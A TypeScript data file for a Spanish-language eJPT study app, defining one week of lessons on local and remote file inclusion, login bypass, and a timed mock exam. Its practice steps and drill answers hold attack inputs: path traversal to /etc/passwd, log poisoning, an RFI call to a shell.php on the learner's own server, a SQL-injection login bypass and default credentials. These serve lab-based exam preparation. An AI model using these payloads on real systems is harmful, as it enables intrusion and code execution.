import { StudyWeek } from "@/lib/types";

/** MES 2 / SEMANA 6 (global 6) — LFI/RFI, Auth Bypass, y PRIMER SIMULACRO COMPLETO */
export const month2Week6: StudyWeek = {
  id: "m2-w6",
  monthId: "m2",
  title: "Semana 6 — LFI/RFI, Auth Bypass + Simulacro #1",
  goal: "Cerrar el dominio Web del eJPT y tomar el primer simulacro completo cronometrado (15 preguntas, 20 min, umbral 70%).",
  detailed: true,
  blocks: [
    {
      id: "m2-w6-b1",
      weekId: "m2-w6",
      order: 1,
      title: "Local File Inclusion (LFI)",
      objective: "Explotar un LFI para leer /etc/passwd y, si aplica, escalar a ejecución de código vía log poisoning.",
      durationMin: 45,
      type: "practice",
      theoryEs: "LFI ocurre cuando la app incluye archivos del servidor basado en input del usuario sin validar (ej. ?page=about.php). Con path traversal (../../../) puedes leer archivos fuera de la carpeta esperada.",
      practiceSteps: [
        "Prueba path traversal básico: ?page=../../../../etc/passwd",
        "Si hay filtro de '../', prueba encoding: ?page=..%2f..%2f..%2fetc%2fpasswd",
        "Intenta leer logs de Apache para log poisoning: ?page=../../../var/log/apache2/access.log",
        "Envenena el log inyectando PHP vía User-Agent, luego inclúyelo para ejecutar código",
      ],
      subtopics: ["web-lfi-rfi"],
      drills: [
        { id: "d1", promptEs: "Escribe el payload de path traversal básico para leer /etc/passwd desde el parámetro 'page'.", answer: "?page=../../../../etc/passwd" },
      ],
      glossary: [
        { en: "Local File Inclusion (LFI)", es: "inclusión local de archivos" },
        { en: "path traversal", es: "traversal de directorios" },
        { en: "log poisoning", es: "envenenamiento de logs" },
      ],
      resources: [{ label: "TryHackMe — File Inclusion", url: "https://tryhackme.com/room/fileinc", platform: "TryHackMe" }],
      closingChecklist: ["Leí /etc/passwd vía LFI en el lab", "Entiendo el concepto de log poisoning para RCE"],
    },
    {
      id: "m2-w6-b2",
      weekId: "m2-w6",
      order: 2,
      title: "Remote File Inclusion (RFI) y Auth Bypass",
      objective: "Explotar un RFI para ejecutar código remoto y hacer bypass de un login vulnerable a SQLi o con credenciales default.",
      durationMin: 50,
      type: "practice",
      theoryEs: "RFI es como LFI pero incluye un archivo REMOTO (tu propio servidor con código malicioso), solo funciona si allow_url_include está activo. Auth bypass explota lógica de login rota: SQLi (' OR '1'='1) o simplemente probar credenciales por defecto (admin:admin).",
      practiceSteps: [
        "Levanta un servidor PHP malicioso en tu Kali: python3 -m http.server 8000",
        "Prueba RFI: ?page=http://<TU_IP>:8000/shell.php",
        "Prueba bypass de login con SQLi: usuario admin' OR '1'='1' -- - , password cualquier cosa",
        "Prueba credenciales default comunes: admin:admin, admin:password, root:toor",
      ],
      subtopics: ["web-lfi-rfi", "web-auth-bypass"],
      drills: [
        { id: "d1", promptEs: "Escribe el payload SQLi típico para bypass de un formulario de login en el campo usuario.", answer: "admin' OR '1'='1' -- -" },
      ],
      glossary: [
        { en: "Remote File Inclusion (RFI)", es: "inclusión remota de archivos" },
        { en: "default credentials", es: "credenciales por defecto" },
      ],
      resources: [{ label: "TryHackMe — OWASP Top 10 (Broken Authentication)", url: "https://tryhackme.com/room/owasptop10", platform: "TryHackMe" }],
      closingChecklist: ["Ejecuté un RFI exitoso en un lab controlado", "Hice bypass de un login con SQLi o credenciales default"],
    },
    {
      id: "m2-w6-b3",
      weekId: "m2-w6",
      order: 3,
      title: "Skill-check Semana 6",
      objective: "Aprobar el skill-check de LFI/RFI/Auth Bypass (70%+) antes del simulacro completo.",
      durationMin: 40,
      type: "checkpoint",
      subtopics: ["web-lfi-rfi", "web-auth-bypass"],
      practiceSteps: ["Toma el skill-check en la app (Simulacros > Skill-checks > Semana 6)"],
      closingChecklist: ["Aprobé el skill-check de Semana 6 con 70% o más"],
    },
    {
      id: "m2-w6-b4",
      weekId: "m2-w6",
      order: 4,
      title: "SIMULACRO COMPLETO #1 (cronometrado, cumulativo)",
      objective: "Responder 15 preguntas en 20 minutos, con temario acumulado de TODO lo cubierto (Mes 1 + Semanas 5-6), alcanzando 70%+.",
      durationMin: 30,
      type: "simulacro",
      theoryEs:
        "Regla fija: si no llegas a 70%, es NO APROBADO sin excepción. Si repruebas, HOY MISMO recibes el listado de sub-temas fallados y un plan de repaso dirigido — pero NO otro simulacro completo hasta la próxima sesión de estudio.",
      subtopics: [],
      practiceSteps: [
        "Ve a la sección Simulacros > Simulacro Completo en la app",
        "Confirma que tienes 20 minutos sin interrupciones antes de empezar (bloquea notificaciones)",
        "Al terminar, revisa la retroalimentación pregunta por pregunta",
      ],
      closingChecklist: [
        "Tomé el simulacro en condiciones reales (cronometrado, sin pausar)",
        "Si aprobé: revisé las preguntas falladas dentro del 30% permitido como repaso opcional",
        "Si reprobé: identifiqué los sub-temas exactos fallados y agendé el repaso dirigido para hoy",
      ],
    },
  ],
};
